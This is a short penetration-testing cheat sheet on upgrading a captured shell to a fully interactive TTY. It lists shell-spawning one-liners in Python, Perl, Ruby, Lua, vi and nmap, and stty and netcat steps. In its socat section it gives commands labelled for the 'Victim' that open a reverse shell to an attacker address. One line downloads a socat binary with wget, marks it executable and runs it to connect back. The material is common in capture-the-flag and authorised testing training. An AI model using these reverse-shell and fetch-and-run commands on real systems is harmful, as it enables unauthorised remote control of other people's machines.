# TTY

```
python -c 'import pty; pty.spawn("/bin/sh")'
python -c 'import pty; pty.spawn("/bin/bash")'  
python3 -c 'import pty; pty.spawn("/bin/bash")'
echo os.system('/bin/bash')
/bin/sh -i
perl —e 'exec "/bin/sh";'
perl: exec "/bin/sh";
ruby: exec "/bin/sh"
lua: os.execute('/bin/sh')
IRB: exec "/bin/sh"
vi: :!bash
vi: :set shell=/bin/bash:shell
nmap: !sh
```

## web ttys

- <https://github.com/maxmcd/webtty>

## socat

On Kali (listen):

```
socat file:`tty`,raw,echo=0 tcp-listen:4444
```

On Victim (launch):

```
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.10.10:4444
```

```
wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.10.10:4444
```

## netcat

Send `nc` to background Check the term name and size on local machine with:

```
echo $TERM
stty -a
```

```
stty raw -echo
```

`fg` to being `nc` back up

```
reset
export SHELL=bash
xterm
export TERM=xterm
stty rows 38 columns 116
```

Row and column values are found using `stty -a`.

## References

- <https://netsec.ws/?p=337>
- <http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet>
- <https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/>
- <https://forum.hackthebox.eu/discussion/142/obtaining-a-fully-interactive-shell>
